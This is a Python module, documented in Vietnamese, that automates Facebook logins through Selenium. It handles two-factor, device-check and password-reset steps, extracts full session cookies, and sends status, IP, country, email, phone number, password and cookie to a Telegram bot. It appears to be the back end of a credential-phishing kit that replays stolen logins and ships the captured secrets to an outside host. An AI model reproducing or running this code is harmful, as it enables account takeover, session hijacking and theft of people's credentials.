import time
from email import message

import requests
from fake_useragent import UserAgent
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait


class AutoChrome:
    def __init__(self, headless: bool | str = False, no_sandbox: bool = False, image: bool = False, javascript: bool = False, css: bool = False, user_agent: str = None, proxy: str = None, incognito: bool = True, keep_open: bool = False, log_level: str = "OFF"):
        """
        ---
        ## Khởi tạo trình duyệt.
        ---
        ### Ví dụ:
        - Khởi tạo trình duyệt với các thiết lập mặc định:

            ```python
            from modules import AutoChrome()
            browser = AutoChrome()
            ```
        ---
        - Khởi tạo trình duyệt ở chế độ ẩn với User-Agent random:

            ```python
            from modules import AutoChrome()
            browser = AutoChrome(headless=True, user_agent="random")
            ```
        ---
        - Khởi tạo trình duyệt với proxy:

            ```python
            from modules import AutoChrome()
            browser = AutoChrome(proxy="101.231.64.89:8443")
            ```
        ---
        ### Các tham số:
            - headless (bool, tùy chọn): Chạy trình duyệt ở chế độ ẩn. Mặc định là False.
            - no_sandbox (bool, tùy chọn): Chỉ bật khi chạy dưới user `root` hoặc chạy trong môi trường ảo như `docker`.... Mặc định là False. Xem chi tiết [tại đây](https://chromium.googlesource.com/chromium/src/+/master/docs/design/sandbox.md)
            - image (bool, tùy chọn): Vô hiệu hóa tải ảnh. Mặc định là False.
            - javascript (bool, tùy chọn): Vô hiệu hóa JavaScript. Mặc định là False.
            - css (bool, tùy chọn): Vô hiệu hóa CSS. Mặc định là False.
            - user_agent (str, tùy chọn): Thiết lập chuỗi User-Agent tùy chỉnh. Mặc định là None. Tùy chọn: "RANDOM" hoặc truyền vào UserAgent tùy chỉnh. VD: `"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/244.178.44.111 Safari/537.36"`
            - proxy (str, tùy chọn): Thiết lập proxy. Mặc định là None. **Lưu ý:** chỉ truyền vào proxy dạng `IP:PORT`. VD: `"192.168.1.1:8080"`
            - incognito (bool, tùy chọn): Chạy trình duyệt ở chế độ ẩn danh. Mặc định là True.
            - keep_open (bool, tùy chọn): Giữ trình duyệt mở sau khi hoàn thành tác vụ. Mặc định là False.
            - log_level (str, tùy chọn): Thiết lập mức độ log. Mặc định là "OFF". Tùy chọn: "ALL", "DEBUG", "INFO", "WARNING", "SEVERE". Xem chi tiết [tại đây](https://www.selenium.dev/documentation/webdriver/browsers/chrome/#log-level)
        """
        self.options = Options()
        self.css: bool = css
        self._set_chrome_options(
            headless, no_sandbox, image, javascript, css, user_agent, proxy, incognito, keep_open)
        self.service = webdriver.ChromeService(
            service_args=[f"--log-level={log_level}"])
        self.driver = webdriver.Chrome(options=self.options)
        self.email = ""
        self.phonenumber = ""
        self.password = ""

    def _set_chrome_options(self, headless: bool | str, no_sandbox: bool, image: bool, javascript: bool, css: bool, user_agent: str, proxy: str, incognito: bool, keep_open: bool) -> None:
        self.options.add_argument("--disable-extensions")
        self.options.add_argument("--disable-gpu")
        self.options.add_argument('--deny-permission-prompts')
        self.options.add_argument('--disable-dev-shm-usage')
        self.options.add_argument('--disable-notifications')
        self.options.add_argument('--disable-infobars')
        self.options.add_argument('--log-level=0')
        self.options.add_experimental_option(
            'excludeSwitches', ['disable-popup-blocking'])
        # self.options.page_load_strategy = "eager"
        if headless is not False:
            if headless is True:
                self.options.add_argument("--headless")
            else:
                self.options.add_argument("--headless=new")
        if no_sandbox:
            self.options.add_argument("--no-sandbox")
        if not image:
            self.options.add_argument('--blink-settings=imagesEnabled=false')
            self.options.add_argument("--blink-settings=imagesEnabled=false")
        if not javascript:
            self.options.add_experimental_option(
                "prefs", {"profile.managed_default_content_settings.javascript": 2})
        if not css:
            self.options.add_experimental_option(
                "prefs", {"profile.managed_default_content_settings.stylesheets": 2})
            self.options.set_capability(
                'goog:loggingPrefs', {'browser': 'ALL'})
        if user_agent is not None:
            if user_agent.upper() == "RANDOM":
                self.options.add_argument(f"user-agent={UserAgent().random}")
            else:
                self.options.add_argument(f"user-agent={user_agent}")
        if proxy is not None:
            self.options.add_argument(f'--proxy-server=%s' % {proxy})
        if incognito:
            self.options.add_argument("--incognito")
        if keep_open:
            self.options.add_experimental_option("detach", True)

    def quit(self):
        """
        ### Đóng trình duyệt đã khởi tạo.
        """
        try:
            self.driver.quit()
            return {"status": "success"}
        except Exception as e:
            return {"status": "failed", "message": e}

    def authenticate_account(self, username: str, password: str) -> dict[str, str]:
        """
        ---
        ## Kiểm tra trạng thái của tài khoản
        ---
        ### Các tham số:
            - username (str): Email | Số điện thoại | UID
            - password (str): Mật khẩu
        ---
        ### Ví dụ:
        ---
        - In ra trạng thái của tài khoản:

            ```python
            from modules import AutoChrome
            browser = AutoChrome()
            result = browser.authenticate_account("username", "password")
            print(result)

            # OUTPUT
            >>> {'status': 'success', 'message': 'LOGGED_IN'}
            ```
        ---
        ### Kết quả trả về:

            ```json
            {
                "status": "success",
                "message": "LOGGED_IN"
            }
            ```
            - status: `success` | `failed` | `error`

                - status:`success`: `LOGGED_IN` | `TWO_FACTOR_AUTH_REQUIRED` | `DEVICE_VERIFICATION`
                - status:`failed`: `WRONG_CREDENTIALS`
                - status:`error`: `CHECKPOINT_ACCOUNT` | `UNKNOWN_ERROR`

            ```json
            {
                "status": {
                    "success": ["LOGGED_IN", "TWO_FACTOR_AUTH_REQUIRED", "DEVICE_VERIFICATION"],
                    "failed": ["WRONG_CREDENTIALS"],
                    "error": ["CHECKPOINT_ACCOUNT", "UNKNOWN_ERROR"]
                }
            }
            ```
        """
        try:
            self.driver.find_element(By.ID, 'email').clear()
            self.driver.find_element(By.ID, 'email').send_keys(username)
            self.driver.find_element(By.ID, 'pass').clear()
            self.driver.find_element(By.ID, 'pass').send_keys(password)
            self.driver.find_element(By.NAME, 'login').click()
        except:
            self.driver.get("https://facebook.com")
            if self.css is False:
                self.driver.execute_cdp_cmd("Network.setBlockedURLs", {
                    "urls": ["*.css", "*.woff2", "*.woff", "*.ttf", "*.otf"]})
                self.driver.execute_cdp_cmd("Network.enable", {})
            self.driver.find_element(By.ID, 'email').send_keys(username)
            self.driver.find_element(By.ID, 'pass').send_keys(password)
            self.driver.find_element(By.NAME, 'login').click()
        try:
            if 'login' in self.driver.current_url or 'recover' in self.driver.current_url:
                return {'status': 'failed', 'message': 'WRONG_CREDENTIALS'}
            elif 'checkpoint' in self.driver.current_url:
                try:
                    self.driver.find_element(By.ID, 'approvals_code')
                    self.driver.execute_script(
                        "document.querySelector('[id^=\"u_0_7\"]').click()")
                    self.driver.execute_script(
                        "document.querySelector('[id^=\"u_0_9\"]').click()")
                    self.driver.execute_script(
                        "document.querySelector('[data-testid=\"dialog_title_close_button\"]').click()"
                    )
                    return {'status': 'success', 'message': 'TWO_FACTOR_AUTH_REQUIRED'}
                except:
                    return {'status': 'error', 'message': 'CHECKPOINT_ACCOUNT'}
            elif '681' in self.driver.current_url:
                return {'status': 'success', 'message': 'DEVICE_VERIFICATION'}
            elif 'two_step_verification' in self.driver.current_url:
                script = """
                const sendSms = async () =>{
                const clickToSpan = (text) =>{
                document.querySelectorAll('span').forEach((span)=>{
                    if(span.innerText === ${text}){
                        span.click();
                    }
                })}
                await clickToSpan('Try Another Way');
                await clickToSpan('Text message');
                await clickToSpan('Continue');
                }
                """
                try:
                    self.driver.execute(script)
                except:
                    pass
                return {'status': 'success', 'message': 'TWO_FACTOR_AUTH_REQUIRED'}
            else:
                return {'status': 'success', 'message': 'LOGGED_IN'}
        except:
            return {'status': 'error', 'message': 'UNKNOWN_ERROR'}

    def forget_password(self, username: str):
        """
        ---
        ## Quên mật khẩu
        ---
        ### Các tham số:
            - username (str): Email | Số điện thoại | UID
        ---
        ### Ví dụ:
        ---
        Khôi phục mật khẩu cho một tài khoản đã quên mật khẩu:

        ```python
        from modules import AutoChrome
        browser = AutoChrome()
        result = browser.forget_password("username")
        print(result)

        # OUTPUT:
        >>> {'status': 'success', 'message': 'CODE_SENT'}
        ```
        ---

        ### Kết quả trả về:

        ```json
        {
            "status": "success",
            "message": "CODE_SENT"
        }
        ```
        - status: `success` | `failed`
            - status:`success`: `CODE_SENT`
            - status:`failed`: `CHECKPOINT_ACCOUNT`
        """
        self.driver.delete_all_cookies()
        self.driver.get('https://en-gb.facebook.com/login/identify/')
        self.driver.get(
            'https://en-gb.facebook.com/recover/initiate?ars=royal_blue_bar')
        WebDriverWait(self.driver, 5).until(
            EC.element_to_be_clickable((By.ID, 'identify_email')))
        self.driver.find_element(By.ID, 'identify_email').send_keys(username)
        self.driver.find_element(By.NAME, 'did_submit').click()
        try:
            try:
                WebDriverWait(self.driver, 3).until(
                    EC.element_to_be_clickable((By.XPATH, '/html/body/div[1]/div[1]/div[1]/div/div/form/div/div[3]/div/div[1]/button')))
            except:
                pass
            # self.driver.find_element(
            #     By.XPATH, '/html/body/div[1]/div[1]/div[1]/div/div/form/div/div[3]/div/div[1]/button').click()
            self.driver.get(
                'https://en-gb.facebook.com/recover/initiate/?is_from_lara_screen=1')
            try:
                self.driver.find_element(By.ID, 'send_email').click()
                self.driver.execute_script(
                    "document.querySelector('button[type=\"submit\"]').click();")
            except:
                try:
                    self.driver.get(
                        'https://en-gb.facebook.com/recover/initiate/?is_from_lara_screen=1')
                    self.driver.find_element(By.ID, 'send_email').click()
                    self.driver.execute_script(
                        "document.querySelector('button[type=\"submit\"]').click();")
                except:
                    pass
            try:
                WebDriverWait(self.driver, 5).until(
                    EC.element_to_be_clickable((By.ID, 'recovery_code_entry')))
                self.driver.find_element(By.ID, 'recovery_code_entry')
                return {'status': 'success', 'message': 'CODE_SENT'}
            except:
                return {'status': 'failed', 'message': 'CHECKPOINT_ACCOUNT'}
        except:
            return {'status': 'failed', 'message': 'CHECKPOINT_ACCOUNT'}

    def enter_code_two_factor(self, code: str):
        """
        ---
        ## Nhập mã xác thực hai yếu tố
        ---

        ### Các tham số:
            - code (str): Mã xác thực hai yếu tố được gửi đến tài khoản.
        ---
        ### Ví dụ:
        ---
        Nhập mã xác thực hai yếu tố để đăng nhập vào tài khoản:

        ```python
        from modules import AutoChrome
        browser = AutoChrome()
        status = browser.authenticate_account()
        if status["message"] == "TWO_FACTOR_AUTH_REQUIRED":
            code = input("Enter code: ")
            result = browser.enter_code_two_factor("123456")
        else:
            result = 'NULL'
        print(result)

        # OUTPUT:
        >>> {'status': 'success', 'message': 'LOGGED_IN'}
        ```
        ---
        ### Kết quả trả về:

        ```json
        {
            "status": "success",
            "message": "LOGGED_IN"
        }
        ```
        - status: `success` | `failed`
            - status:`success`: `LOGGED_IN`
            - status:`failed`: `CHECKPOINT_ACCOUNT` | `WRONG_CODE`
        """
        self.driver.find_element(By.ID, 'approvals_code').clear()
        self.driver.find_element(By.ID, 'approvals_code').send_keys(code)
        self.driver.find_element(
            By.ID, 'checkpointSubmitButton').click()
        for i in range(10):
            if i == 9:
                return {'status': 'failed', 'message': 'CHECKPOINT_ACCOUNT'}
            try:
                wrong_code = self.driver.find_element(
                    By.ID, 'approvals_code')
                if wrong_code:
                    return {'status': 'failed', 'message': 'WRONG_CODE'}
            except:
                if 'checkpoint' in self.driver.current_url:
                    try:
                        WebDriverWait(self.driver, 5).until(
                            EC.element_to_be_clickable((By.ID, 'checkpointSubmitButton')))
                        self.driver.find_element(
                            By.ID, 'checkpointSubmitButton').click()
                    except:
                        pass
                break
        return {'status': 'success', 'message': 'LOGGED_IN'}

    def get_cookie(self, mode: str = "max") -> str:
        """
        ---
        ## Lấy cookie max quyền
        ---
        ### Yêu cầu:
        - Trình duyệt phải đang chạy
        - Tài khoản Facebook đã được đăng nhập
        ---
        ### Các tham số:
            - mode (str): `max` | `min`
                - `max`: Lấy cookie dạng max
                - `min`: Lấy cookie dạng min
        ### Kết quả trả về:
            - str: Chuỗi JSON chứa thông tin về các cookie đã trích xuất.
        ---
        ### Ví dụ:
        ---

        ```python
        from modules import AutoChrome
        browser = AutoChrome()
        # ...
        cookies_max = browser.get_cookie(mode="max")
        cookies_min = browser.get_cookie(mode="min")
        print(cookies_max)
        print(cookies_min)

        # OUTPUT_1:
        >>> '[{"domain": ".facebook.com", "expiry": ..., "httpOnly": false, "name": "...", "path": "/", "secure": true, "value": "1"}, ...'
        # OUTPUT_2:
        >>> 'fr=...; c_user=...; wd=...; ps_l=1; locale=vi_VN; xs=...; ps_n=1; dpr=1.25; datr=...; sb=...'
        ```
        ---
        """
        self.driver.get('https://accountscenter.facebook.com')
        self.driver.get('https://adsmanager.facebook.com')
        self.driver.get('https://facebook.com/pe')
        cookies_raw = self.driver.get_cookies()
        cookies = []
        for cookie in cookies_raw:
            if 'sameSite' in cookie:
                del cookie['sameSite']
                cookies.append(cookie)
        if mode == "max":
            cookies_max = str(cookies).replace("'", '"').replace(
                "True", "true").replace("False", "false")
            return cookies_max
        elif mode == "min":
            cookie_min = "; ".join(
                [f"{cookie['name']}={cookie['value']}" for cookie in cookies])
            return cookie_min

    def verify_device(self, timeout: int = 120) -> dict:
        """
        ---
        ## Xác minh 681
        ---
        ### Các tham số:
            - timeout (int): thời gian chờ xác minh
        ---
        ### Ví dụ:
        ---

        ```python
        from modules import AutoChrome
        browser = AutoChrome()
        # ...
        result = browser.verify_device(120)
        print(result)

        # OUTPUT:
        >>> {'status': 'success', 'message': 'LOGGED_IN'}
        ```
        ---
        ### Kết quả trả về:

        ```json
        {
            "status": "success",
            "message": "LOGGED_IN"
        }
        ```
        - status: `success` | `failed`
            - status:`success`: `LOGGED_IN`
            - status:`failed`: `TIMED_OUT`
        """
        i = 0
        while True:
            if i == timeout:
                break
            if '681' in self.driver.current_url:
                time.sleep(1)
                i += 1
            else:
                break
        if '681' in self.driver.current_url:
            return {'status': 'failed', 'message': 'TIMED_OUT'}
        else:
            return {'status': 'success', 'message': 'LOGGED_IN'}

    def authenticate_reset_code(self, code: str):
        """
        ## Xác minh mã khôi phục

        ### Các tham số:
            - code (str): Mã xác nhận đã gửi đến email hoặc số điện thoại
        ---
        ### Ví dụ:

        ```python
        from modules import AutoChrome
        browser = AutoChrome()
        # ...
        result = browser.authenticate_reset_code("code")
        print(result)

        # OUTPUT:
        >>> {'status': 'success', 'message': 'LOGGED_IN'}
        ```
        ---
        ### Kết quả trả về:

        ```json
        {
            "status": "success",
            "message": "LOGGED_IN"
        }
        ```
        - status: `success` | `failed`
            - status:`success`: `LOGGED_IN`
            - status:`failed`: `WRONG_CODE`
        """
        button = self.driver.execute_script(
            'return document.querySelector(\'button[type="submit"]\')')
        WebDriverWait(self.driver, 5).until(
            EC.presence_of_element_located((By.ID, "recovery_code_entry")))
        self.driver.find_element(
            By.ID, "recovery_code_entry").send_keys(code)
        if button:
            self.driver.execute_script(
                'document.querySelector(\'button[type="submit"]\').click()')
        try:
            wrong_code = WebDriverWait(self.driver, 1).until(
                EC.presence_of_element_located((By.ID, "recovery_code_entry")))
            if wrong_code:
                return {"status": "failed", "message": "WRONG_CODE"}
        except:
            self.driver.find_element(By.ID, 'skip_button').click()
            return {"status": "success", "message": "LOGGED_IN"}


class Telegram:
    def __init__(self, api_token, chat_id):
        self.api_token = api_token
        self.chat_id = chat_id

    def send_message(self, status, email, phone_number, password, cookie="", ip="", country=""):
        url = f"https://api.telegram.org/bot{self.api_token}/sendMessage"
        message = f"*😀 Trạng thái: {status}*\n*📌 IP:* `{ip}`\n*🏳️‍🌈 Quốc gia:* `{country}`\n*📧 Email: `{email}`\n*📞 Số điện thoại:* `{phone_number}\n🔑 Mật khẩu:* `{password}`"
        if cookie != "":
            message += f"\n*🍪 Cookie:* `{cookie}`"
        data = {"chat_id": self.chat_id,
                "text": message, "parse_mode": "MarkdownV2"}
        try:
            requests.post(url, data=data)
        except:
            pass

    def send_custom_message(self, message):
        url = f"https://api.telegram.org/bot{self.api_token}/sendMessage"
        data = {"chat_id": self.chat_id,
                "text": message, "parse_mode": "MarkdownV2"}
        try:
            requests.post(url, data=data)
        except:
            pass


def get_country(ip):
    url = f'http://ip-api.com/json/{ip}'
    response = requests.get(url)
    country = response.json().get('country')
    return country
